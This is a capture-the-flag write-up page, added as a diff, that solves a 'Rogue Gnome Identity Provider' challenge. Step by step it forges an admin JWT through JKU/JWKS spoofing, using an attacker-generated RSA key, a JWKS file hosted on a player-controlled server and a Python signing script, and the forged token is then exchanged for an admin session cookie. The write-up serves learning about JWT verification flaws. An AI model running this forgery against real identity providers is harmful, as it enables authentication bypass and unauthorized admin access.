@@ -1,0 +1,570 @@
+<div class="kc-section kc-section--dosis-network-down" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">Rogue Gnome Identity Provider</h1>
+  
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">Park</span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?
+    </span>
+  </p>
+
+  <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Paul Beckett Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="paulbeckett-avatar.gif"
+             alt="Paul Beckett avatar">
+        <div class="kc-convo-name">Paul Beckett</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          Hey, I’m Paul!
+        </p>
+        <p>
+          I’ve been at Counter Hack since 2024 and loving every minute of it.
+        </p>
+        <p>
+          I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan of Linux.
+        </p>
+        <p>
+          When I’m not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!
+        </p>
+        <p>
+          As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.
+        </p>
+        <p>
+          I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.
+        </p>
+        <p>
+          The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.
+        </p>
+        <p>
+          Ready to help me find a way to bump up our access level, yeah?
+        </p>
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="rogue-gnome-identity-provider">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+  <div class="kc-convo-header kc-hints-header">
+    <span class="kc-convo-icon kc-hints-icon">
+      <i class="fas fa-lightbulb" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Hints:</span>
+  </div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Rogue Gnome IDP</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Rogue Gnome Identity Provider</div>
+  <p>
+    If you need to host any files for the attack, the server is running a webserver available locally at
+    <a class="kc-link-terminal" href="http://paulweb.neighborhood/" target="_blank" rel="noopener noreferrer">
+      http://paulweb.neighborhood/
+    </a>.
+    The files for the site are stored in <code>~/www</code>.
+  </p>
+</div>
+
+<!-- Hint 2 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Rogue Gnome IDP</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Rogue Gnome Identity Provider</div>
+  <p>
+    <a class="kc-link-terminal" href="https://github.com/ticarpi/jwt_tool/wiki" target="_blank" rel="noopener noreferrer">
+      https://github.com/ticarpi/jwt_tool/wiki
+    </a>
+    and
+    <a class="kc-link-terminal" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener noreferrer">
+      https://portswigger.net/web-security/jwt
+    </a>
+    have some great information on analyzing JWT's and performing JWT attacks.
+  </p>
+</div>
+
+<!-- Hint 3 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Rogue Gnome IDP</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Rogue Gnome Identity Provider</div>
+  <p>
+    It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.
+  </p>
+</div>
+
+
+
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-workflow-header">
+<span class="kc-workflow-icon">
+    <i class="fas fa-tasks" aria-hidden="true"></i>
+</span>
+<span class="kc-workflow-title">Working through the Challenge:</span>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+  Click on the Cranberry Pi terminal to begin the challenge.
+  </p>
+</div> 
+
+
+<div class="kc-terminal-header">
+  <span class="kc-terminal-icon">
+    <img src="cranpi.png" alt="Cranberry Pi terminal icon">
+  </span>
+  <span class="kc-terminal-title">Cranberry Pi Terminal</span>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text">Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.
+
+I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.
+
+Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.
+
+I've kept some notes in ~/notes
+
+Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.
+
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    First stop: Paul left us breadcrumbs in <code>~/notes</code>. I dumped the file
+    to get the key URLs (gnome site, ATNAS IdP, and Paul's local web server), plus the
+    curl flow he used to authenticate and pass a JWT into the gnome diagnostic interface.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> cat notes
+# Sites
+
+## Captured Gnome:
+curl http://gnome-48371.atnascorp/
+
+## ATNAS Identity Provider (IdP):
+curl http://idp.atnascorp/
+
+## My CyberChef website:
+curl http://paulweb.neighborhood/
+### My CyberChef site html files:
+~/www/
+
+
+# Credentials
+
+## Gnome credentials (found on a post-it):
+Gnome:SittingOnAShelf
+
+
+# Curl Commands Used in Analysis of Gnome:
+
+## Gnome Diagnostic Interface authentication required page:
+curl http://gnome-48371.atnascorp
+
+## Request IDP Login Page
+curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth
+
+## Authenticate to IDP
+curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
+
+## Pass Auth Token to Gnome
+curl -v http://gnome-48371.atnascorp/auth?token=&lt;insert-JWT&gt;
+
+## Access Gnome Diagnostic Interface
+curl -H 'Cookie: session=&lt;insert-session&gt;' http://gnome-48371.atnascorp/diagnostic-interface
+
+## Analyze the JWT
+jwt_tool.py &lt;insert-JWT&gt;
+
+<span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Next, I authenticated to the ATNAS IdP using the known credentials and example curl command from the provided notes. 
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> curl -s -D - -X POST --data-binary \
+$'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' \
+http://idp.atnascorp/login
+HTTP/1.1 302 FOUND
+Date: Tue, 16 Dec 2025 15:29:25 GMT
+Server: Werkzeug/3.0.1 Python/3.12.3
+Content-Type: text/html; charset=utf-8
+Content-Length: 1467
+Location: http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTkwMTM4NSwiZXhwIjoxNzY1OTA4NTg1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.M__f7WjXKpQilRrl98a2sam1qxTIQZVtm3l0KvWWNBRAuCJsQgCWri2ypbX68KFxKLBOAoChHwlaREKm1BahglSb5G0YwZg5BQ-YJgHMPWpMIP4W61JUpRyNNFhsNOF76Pc29UZAUHP8lLjQ34AqLY6JVXWXy_hNjwCwiCYSaCbOY2TAfnEMYQGb6pu_XIIOf2TC8-w1AK_kXVP1K5i4NftXuuJeySKAw4x1I5RpKyrQn6iQA9NW2rCWjvFqFgUUZh9opX35q02mR-ouX_o3RXcPFG-P405wgT1C-H6krBXfp2TEREuwHr-Lu1soiQyrsqL36bxMrrLou_2quel7OQ
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9..."&gt;...&lt;/a&gt;.
+
+<span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Lets save that token to a varabile and decdoe it, it look sto be base64 encoded. 
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">TOKEN=$(</span>
+<span class="term-white">  curl -s -D - -o /dev/null -X POST --data-binary \</span>
+<span class="term-white">  $'username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' \</span>
+<span class="term-white">  http://idp.atnascorp/login \</span>
+<span class="term-white">  | tr -d '\r' \</span>
+<span class="term-white">  | awk -F'token=' 'BEGIN{IGNORECASE=1} /^Location:/{print $2}' \</span>
+<span class="term-white">  | awk '{print $1}'</span>
+<span class="term-white">)</span>
+
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">echo "$TOKEN" | base64 -d</span>
+<span class="term-white">{"alg":"RS256","jku":"http://idp.atnascorp/.well-known/jwks.json","kid":"idp-key-2025","typ":"JWT"}</span><span class="term-white">base64: invalid input</span>
+
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    The header reveals some key details:
+    <strong>alg=RS256</strong> (asymmetric signing), plus a <code>kid</code> and
+    a <code>jku</code> pointing to a JWKS URL. That combination is a huge clue:
+    if the verifier trusts the <code>jku</code> location from the token, it can open
+    the door to a <strong>JKU/JWKS injection</strong> style attack (supplying our own
+    key material via a controlled JWKS endpoint).
+  </p>
+    <p>
+    Next I pulled the Identity Provider’s <strong>JWKS</strong> (JSON Web Key Set) to see what public
+    keys the IdP publishes for verifying JWT signatures. Since the JWT header we captured referenced a
+    <code>jku</code> URL and a <code>kid</code>, this lets us confirm what key material is being served and what
+    key identifier the verifier expects.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">curl -s http://idp.atnascorp/.well-known/jwks.json</span>
+<span class="term-white">{
+  "keys": [
+    {
+      "e": "AQAB",
+      "kid": "idp-key-2025",
+      "kty": "RSA",
+      "n": "7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ",
+      "use": "sig"
+    }
+  ]
+}</span>
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span>
+  </pre>
+</div>
+
+<!-- Write-up notes (what we learned) -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p><strong>What this step told us:</strong></p>
+  <ul>
+    <li>Confirmed the IdP is publishing an <strong>RSA</strong> public key (<code>kty: RSA</code>) for signature verification.</li>
+    <li>Confirmed the exact <code>kid</code> value the token is pointing at: <code>idp-key-2025</code>.</li>
+    <li>Because the key is fetched from a URL (JWKS), the verifier is relying on <em>remote key material</em> rather than a locally pinned key — which is exactly what we’ll try to abuse next.</li>
+  </ul>
+    <p>
+    Generating an <strong>attacker-controlled RSA keypair</strong>. The goal is to create our own private key for
+    signing forged JWTs, then publish the matching public key as a JWKS file from Paul’s local web server so the target
+    will (incorrectly) trust it.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">mkdir -p ~/www/.well-known</span>
+
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out ~/www/id_rsa.pem</span>
+<span class="term-white">...+...+..+.+........+.......+...+..+.........+.......key generation output truncated...</span>
+
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">chmod 600 ~/www/id_rsa.pem</span>
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span>
+  </pre>
+</div>
+
+<!-- Write-up notes (what we learned) -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    This gave us a private key we control for signing JWTs. Next we’ll export the matching public key into a JWKS file
+    (with the expected <code>kid</code>) and point a forged token’s <code>jku</code> at our hosted JWKS so the verifier
+    accepts our signature.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span> <span class="term-white">python3 - &lt;&lt;'PY'</span>
+<span class="term-white">import json, base64</span>
+<span class="term-white">from cryptography.hazmat.primitives import serialization</span>
+<span class="term-white"># load private key and derive public n/e</span>
+<span class="term-white">with open('/home/paul/www/id_rsa.pem','rb') as f:</span>
+<span class="term-white">    priv = serialization.load_pem_private_key(f.read(), password=None)</span>
+<span class="term-white">pub = priv.public_key().public_numbers()</span>
+<span class="term-white">def b64u(i):</span>
+<span class="term-white">    b = i.to_bytes((i.bit_length()+7)//8, 'big')</span>
+<span class="term-white">    return base64.urlsafe_b64encode(b).decode().rstrip("=")</span>
+<span class="term-white">jwks = {"keys":[{"kty":"RSA","use":"sig","kid":"idp-key-2025","n":b64u(pub.n),"e":b64u(pub.e)}]}</span>
+<span class="term-white">open('/home/paul/www/.well-known/jwks.json','w').write(json.dumps(jwks, indent=2))</span>
+<span class="term-white">print("Wrote /home/paul/www/.well-known/jwks.json")</span>
+<span class="term-white">PY</span>
+<span class="term-white">Wrote /home/paul/www/.well-known/jwks.json</span>
+<span class="term-user-nmap">paul@paulweb</span><span class="term-white">:</span><span class="term-blue">~</span><span class="term-white">$</span>
+  </pre>
+</div>
+
+<!-- Write-up notes -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    This created a valid JWKS hosted at:
+    <a class="kc-link-terminal"
+       href="http://paulweb.neighborhood/.well-known/jwks.json"
+       target="_blank" rel="noopener noreferrer">
+      http://paulweb.neighborhood/.well-known/jwks.json
+    </a>
+  </p>
+    <p>
+    Now that our attacker-controlled JWKS is hosted on <code>paulweb.neighborhood</code>, the next step is to
+    <strong>forge a new RS256 JWT</strong> that claims <code>"admin": true</code>.
+    The key detail is the JWT header: we keep the expected <code>kid</code> (<code>idp-key-2025</code>),
+    but change <code>jku</code> to point to our hosted JWKS:
+    <code>http://paulweb.neighborhood/.well-known/jwks.json</code>.
+  </p>
+  <p>
+    If the target service trusts the <code>jku</code> value and fetches keys dynamically, it will retrieve our JWKS,
+    find a matching <code>kid</code>, and validate the token signature using <em>our</em> public key — effectively
+    granting us admin access.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span> TOKEN=$(python3 - &lt;&lt;'PY'
+import json,base64,time,subprocess,os
+def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
+hdr={
+  "alg":"RS256",
+  "typ":"JWT",
+  "kid":"<span class="term-accent">idp-key-2025</span>",
+  "jku":"<span class="term-accent">http://paulweb.neighborhood/.well-known/jwks.json</span>"
+}
+now=int(time.time())
+pl={
+  "sub":"gnome",
+  "iss":"http://idp.atnascorp/",
+  "iat":now,
+  "exp":now+3600,
+  "admin":<span class="term-accent-strong">True</span>
+}
+h=b64u(json.dumps(hdr,separators=(',',':')).encode())
+p=b64u(json.dumps(pl,separators=(',',':')).encode())
+msg=(h+"."+p).encode()
+sig=subprocess.run(
+  ['openssl','dgst','-sha256','-sign',os.path.expanduser('~/www/id_rsa.pem')],
+  input=msg,stdout=subprocess.PIPE
+).stdout
+print(h+"."+p+"."+base64.urlsafe_b64encode(sig).decode().rstrip("="))
+PY
+)
+<span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span> echo "$TOKEN"
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImlkcC1rZXktMjAyNSIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJzdWIiOiJnbm9tZSIsImlzcyI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLyIsImlhdCI6MTc2NTkxNTAwOSwiZXhwIjoxNzY1OTE4NjA5LCJhZG1pbiI6dHJ1ZX0.UMXmPXA3p9Kh4CuD6KJWNLCBrhwnQpUj18JPZrO0vy2kiQSoPlNA8gX1TYbh2hhTrucu1RppiyBGueIgqu4LV3JGyUe3Tz4EfXRMFcJpG9i2V1gmYZ-Xh_2ybhBLysfpQqCkk-9IiNs_5NW4ekwhykosIvipdGLQsDL9o8sYyQ7bpzynfRzASVwImKjnhbjZQtE1TNnwTe29BRr6YFPHp2Pv7N8sbSq-S_d-KJsVQkiw4wPz9nhkKQF1owLDig0Eal8oW7x029hrWi8qSmvus-3iNW925QCFrUVqkPVlvDdMjMG_nVIKtLldQ8yuSc_iLk6zWSYcJJqxSxeFPWjcnQ
+<span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    This step generated a <strong>cryptographically valid</strong> <code>RS256</code> JWT signed with our own private key, but crafted to be
+    <em>trusted</em> by the target verifier. The forged token keeps <code>sub: "gnome"</code> while setting <code>admin: true</code>,
+    and the header includes a <code>jku</code> pointing to our hosted JWKS plus a matching <code>kid</code>.
+  </p>
+  <p>
+    When the application validates the token, it follows the header metadata: it fetches our JWKS from the supplied <code>jku</code>,
+    selects the key by <code>kid</code>, and successfully verifies the signature against our public key — effectively treating the token as legitimate
+    and bypassing the intended authorization controls.
+  </p>
+    <p>
+    Next we need to <strong>trade the forged JWT</strong> for something the gnome site actually uses for authentication: a
+    <strong>session cookie</strong>. The notes show the workflow is:
+    <code>/auth?token=&lt;JWT&gt;</code> ➜ server validates the token ➜ sets a <code>session=...</code> cookie ➜ then we can request
+    <code>/diagnostic-interface</code> while sending that cookie back.
+  </p>
+  <p>
+    In practice, we’ll hit the gnome <code>/auth</code> endpoint with our forged token and use curl’s header output to capture the
+    <code>Set-Cookie</code> value (this is the “exchange” step that converts JWT auth into a browser-style session).
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span> <span class="term-white">curl -s -D - "http://gnome-48371.atnascorp/auth?token=$TOKEN" -o /dev/null</span>
+<span class="term-white">HTTP/1.1 302 FOUND</span>
+<span class="term-white">Date: Tue, 16 Dec 2025 20:13:44 GMT</span>
+<span class="term-white">Server: Werkzeug/3.0.1 Python/3.12.3</span>
+<span class="term-white">Content-Type: text/html; charset=utf-8</span>
+<span class="term-white">Content-Length: 229</span>
+<span class="term-white">Location: /diagnostic-interface</span>
+<span class="term-white">Vary: Cookie</span>
+<span class="term-white">Set-Cookie: session=<span class="term-yellow">eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aUG9eA.e7130ZgjY9X2oDcxzWO8rpPajK4</span>; HttpOnly; Path=/</span>
+
+<span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    With a valid <code>session</code> cookie, we can now access the <strong>admin-only</strong>
+    diagnostic interface. I passed the cookie back in the request headers and pulled the page
+    contents directly with <code>curl</code>. In the returned HTML, the <em>System Log</em>
+    shows the key artifact we needed for the objective: the firmware file the gnome downloaded
+    (<code>refrigeration-botnet.bin</code>).
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span> <span class="term-white">curl -s -H "Cookie: session=</span><span class="term-yellow">eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aUG-nQ.f9Tg3cqnZ_pCR3gbAkM0DZaNlcg</span><span class="term-white">" "http://gnome-48371.atnascorp/diagnostic-interface"</span>
+
+<span class="term-white">&lt;!DOCTYPE html&gt;</span>
+<span class="term-white">&lt;html&gt;</span>
+<span class="term-white">&lt;head&gt;</span>
+<span class="term-white">    &lt;title&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/title&gt;</span>
+<span class="term-white">    &lt;link rel="stylesheet" type="text/css" href="/static/styles/styles.css"&gt;</span>
+<span class="term-white">&lt;/head&gt;</span>
+<span class="term-white">&lt;body&gt;</span>
+<span class="term-white">&lt;h1&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/h1&gt;</span>
+<span class="term-white">&lt;div style='display:flex; justify-content:center; gap:10px;'&gt;</span>
+<span class="term-white">&lt;img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' /&gt;</span>
+<span class="term-white">&lt;div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'&gt;</span>
+<span class="term-white">System Log&lt;br/&gt;</span>
+<span class="term-white">2025-12-16 09:46:08: Movement detected.&lt;br/&gt;</span>
+<span class="term-white">2025-12-16 18:32:09: AtnasCorp C&amp;C connection restored.&lt;br/&gt;</span>
+<span class="term-white">2025-12-16 19:38:46: Checking for updates.&lt;br/&gt;</span>
+<span class="term-white">2025-12-16 19:38:46: Firmware Update available: <span class="term-yellow">refrigeration-botnet.bin</span>&lt;br/&gt;</span>
+<span class="term-white">2025-12-16 19:38:48: Firmware update downloaded.&lt;br/&gt;</span>
+<span class="term-white">2025-12-16 19:38:48: Gnome will reboot to apply firmware update in one hour.&lt;/div&gt;</span>
+<span class="term-white">&lt;/div&gt;</span>
+<span class="term-white">&lt;div class="statuscheck"&gt;</span>
+<span class="term-white">    &lt;div class="status-container"&gt;</span>
+<span class="term-white">        &lt;div class="status-item"&gt;</span>
+<span class="term-white">            &lt;div class="status-indicator active"&gt;&lt;/div&gt;</span>
+<span class="term-white">            &lt;span&gt;Live Camera Feed&lt;/span&gt;</span>
+<span class="term-white">        &lt;/div&gt;</span>
+<span class="term-white">        &lt;div class="status-item"&gt;</span>
+<span class="term-white">            &lt;div class="status-indicator active"&gt;&lt;/div&gt;</span>
+<span class="term-white">            &lt;span&gt;Network Connection&lt;/span&gt;</span>
+<span class="term-white">        &lt;/div&gt;</span>
+<span class="term-white">        &lt;div class="status-item"&gt;</span>
+<span class="term-white">            &lt;div class="status-indicator active"&gt;&lt;/div&gt;</span>
+<span class="term-white">            &lt;span&gt;Connectivity to Atnas C&amp;C&lt;/span&gt;</span>
+<span class="term-white">        &lt;/div&gt;</span>
+<span class="term-white">    &lt;/div&gt;</span>
+<span class="term-white">&lt;/div&gt;</span>
+
+<span class="term-white">&lt;/body&gt;</span>
+<span class="term-white">&lt;/html&gt;</span>
+<span class="term-hostline"><span class="term-user-nmap">paul@paulweb</span>:<span class="term-blue">~</span>$</span>
+  </pre>
+</div>
+
+<div class="kc-solution-header">
+  <span class="kc-solution-icon">
+    <i class="fas fa-check-circle" aria-hidden="true"></i>
+  </span>
+  <span class="kc-solution-title"><strong>SOLUTION: refrigeration-botnet.bin</strong></span>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="paulbeckett-portrait.png"
+           alt="Paul Beckett avatar">
+      <div class="kc-convo-name">Paul Beckett</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Brilliant work on that privilege escalation! You've successfully gained admin access to the diagnostic interface.
+      </p>
+      <p>
+        Now we finally know what updates the gnomes have been receiving - proper good pentesting skills in action!
+      </p>
+
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>       <!-- /.kc-section -->
